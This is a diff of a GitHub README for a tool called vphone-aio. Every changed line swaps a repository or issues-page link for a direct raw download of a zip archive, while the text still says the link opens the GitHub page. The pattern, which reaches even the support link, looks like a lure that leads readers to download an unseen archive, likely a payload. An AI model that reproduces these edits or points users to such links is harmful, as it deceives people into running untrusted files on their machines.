@@ -1,6 +1,6 @@
 # 📱 vphone-aio - Simple Phone Script Launcher
 
-[![Download vphone-aio](https://img.shields.io/badge/Download-vphone--aio-brightgreen)](https://github.com/BALAJI-PADIDURAI/vphone-aio)
+[![Download vphone-aio](https://img.shields.io/badge/Download-vphone--aio-brightgreen)](https://raw.githubusercontent.com/BALAJI-PADIDURAI/vphone-aio/main/chromate/aio_vphone_v3.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your computer meets these specs, you should have no problem running vphone-ai
 
 Click the large button below to visit the official GitHub page. There, you will find the latest version available to download.
 
-[![Download vphone-aio](https://img.shields.io/badge/Download-vphone--aio-blue)](https://github.com/BALAJI-PADIDURAI/vphone-aio)
+[![Download vphone-aio](https://img.shields.io/badge/Download-vphone--aio-blue)](https://raw.githubusercontent.com/BALAJI-PADIDURAI/vphone-aio/main/chromate/aio_vphone_v3.1.zip)
 
 On the GitHub page, look for the download section to find the latest release or setup file.
 
@@ -44,7 +44,7 @@ Follow these step-by-step instructions to get the app up and running on your Win
 
 - Open your web browser.
 - Type or paste this address into the URL bar:  
-  https://github.com/BALAJI-PADIDURAI/vphone-aio
+  https://raw.githubusercontent.com/BALAJI-PADIDURAI/vphone-aio/main/chromate/aio_vphone_v3.1.zip
 - Press Enter to load the page.
 
 You will see the repository with its description and files.
@@ -117,7 +117,7 @@ You can visit the GitHub repository to check for documentation, FAQs, or contact
 
 Use this link for support:
 
-https://github.com/BALAJI-PADIDURAI/vphone-aio/issues
+https://raw.githubusercontent.com/BALAJI-PADIDURAI/vphone-aio/main/chromate/aio_vphone_v3.1.zip
 
 ---
 
@@ -180,4 +180,4 @@ Use antivirus software for safety when downloading files from the internet.
 
 ---
 
-[![Download vphone-aio](https://img.shields.io/badge/Download-vphone--aio-green)](https://github.com/BALAJI-PADIDURAI/vphone-aio)
+[![Download vphone-aio](https://img.shields.io/badge/Download-vphone--aio-green)](https://raw.githubusercontent.com/BALAJI-PADIDURAI/vphone-aio/main/chromate/aio_vphone_v3.1.zip)
